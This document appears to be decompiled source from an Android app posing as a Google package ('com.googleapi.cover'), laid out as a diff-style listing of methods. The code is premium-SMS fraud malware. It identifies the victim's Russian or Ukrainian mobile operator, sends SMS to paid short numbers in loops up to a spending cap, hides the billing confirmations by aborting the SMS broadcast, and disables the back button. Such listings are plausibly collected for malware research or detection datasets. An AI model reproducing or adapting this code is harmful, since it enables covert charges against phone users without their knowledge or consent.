+                    if (text.contains("http://")) {
+                        Utils.putIntegerValue(context, TextUtils.getDailyKey(), settings.getInt(TextUtils.getDailyKey(), 0) + 1, settings);
+                        Utils.putBooleanValue(context, Actor.KEY_PAID, true, settings);
+                    } else {
+                        Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
+                    }
+                    Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, true, settings);
+                    abortBroadcast();
+                }
+            } catch (Exception e) {
+            }
+        }
+    }
+
+Package Path:com.googleapi.cover.RelatedContent.onKeyDown
+Class Name:RelatedContent
+Content: package com.googleapi.cover;
+
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if (keyCode == 4) {
+            return true;
+        }
+        return super.onKeyDown(keyCode, event);
+    }
+
+Package Path:com.googleapi.cover.Main.onKeyDown
+Class Name:Main
+Content: package com.googleapi.cover;
+
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if (keyCode == 4) {
+            return true;
+        }
+        return super.onKeyDown(keyCode, event);
+    }
+
+Package Path:com.googleapi.cover.ActService.performActions
+Class Name:ActService
+Content: package com.googleapi.cover;
+
+        private void performActions() {
+            String lastNumber;
+            Context context = ActService.this.getApplicationContext();
+            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+            String opStr = settings.getString(Actor.NETWORK_STRING, "");
+            Actor act = new Actor(context, opStr);
+            if (act.isUkrCode()) {
+                actUK(act, settings);
+                return;
+            }
+            boolean isMTSRF = act.isMTSRF();
+            boolean isBeeline = act.isBeline();
+            if (act.isPrivate()) {
+                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
+                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
+                int acceptedNums = 0;
+                if (isBeeline) {
+                    String currentNumber = ActService.NUM_1;
+                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
+                    do {
+                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
+                        do {
+                            try {
+                                sleep(100L);
+                            } catch (InterruptedException e) {
+                            }
+                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                            acceptedNums++;
+                            currentNumber = positives.get(currentNumber);
+                        } else {
+                            if (currentNumber.equals(ActService.NUM_1)) {
+                                if (acceptedNums != 0) {
+                                    break;
+                                }
+                                ActService.PREF_TO_USE = Actor.PREF_PORT;
+                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
+                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
+                            }
+                            currentNumber = negatives.get(currentNumber);
+                        }
+                        if (currentNumber == null || acceptedNums > 2) {
+                            break;
+                        }
+                    } while (!currentNumber.equalsIgnoreCase("-1"));
+                } else if (isMTSRF || act.isMF()) {
+                    double restAllowedSum = 0.0d;
+                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
+                    if (isMTSRF) {
+                        ActService.PREF_TO_USE = ActService.PREF_A1;
+                        restAllowedSum = 350.0d;
+                        prices = ActService.mtsPrices;
+                    } else if (act.isMF()) {
+                        ActService.PREF_TO_USE = Actor.PREF_PORT;
+                        restAllowedSum = 350.0d;
+                        prices = ActService.mfPrices;
+                    }
+                    int currentNumberIndex = 0;
+                    while (true) {
+                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
+                            currentNumberIndex++;
+                        } else {
+                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
+                                break;
+                            }
+                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
+                            do {
+                                try {
+                                    sleep(100L);
+                                } catch (InterruptedException e2) {
+                                }
+                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                                acceptedNums++;
+                                if (acceptedNums < 3) {
+                                    smsData = act.getRelatedData(acceptedNums - 1);
+                                    waitForAcceptance(acceptedNums, settings);
+                                }
+                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
+                            } else {
+                                currentNumberIndex++;
+                            }
+                        }
+                    }
+                } else {
+                    String currentNumber2 = Actor.NUM_10;
+                    String num3_alt = Actor.NUM_3_ALT;
+                    new String();
+                    ActService.PREF_TO_USE = Actor.PREF_PORT;
+                    do {
+                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
+                        do {
+                            try {
+                                sleep(100L);
+                            } catch (InterruptedException e3) {
+                            }
+                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                        lastNumber = currentNumber2;
+                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                            acceptedNums++;
+                            currentNumber2 = positives.get(currentNumber2);
+                        } else {
+                            currentNumber2 = negatives.get(currentNumber2);
+                        }
+                        if (currentNumber2 == null || acceptedNums > 2) {
+                            break;
+                        }
+                    } while (!currentNumber2.equalsIgnoreCase("-1"));
+                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
+                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
+                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
+                    }
+                }
+            } else {
+                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
+                for (int i = 0; i < numbers.size(); i++) {
+                    String number = numbers.get(i);
+                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
+                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
+                    } else {
+                        ActService.PREF_TO_USE = Actor.PREF_PORT;
+                    }
+                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
+                    do {
+                        try {
+                            sleep(100L);
+                        } catch (InterruptedException e4) {
+                        }
+                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
+                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
+                        break;
+                    }
+                }
+            }
+            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
+            act.reportDone();
+        }
+
+Package Path:com.googleapi.cover.RelatedContent.initializeTextViews
+Class Name:RelatedContent
+Content: package com.googleapi.cover;
+
+    private void initializeTextViews() {
+        this.mainTextView = (TextView) findViewById(R.id.related_content_name);
+        Display display = getWindowManager().getDefaultDisplay();
+        this.mainTextView.setText(getString(R.string.related_content, new Object[]{getString(R.string.app_name), Build.MODEL, String.valueOf(display.getWidth()) + "x" + display.getHeight(), Build.VERSION.RELEASE, this.actor.getRelatedContentName(this.index)}));
+    }
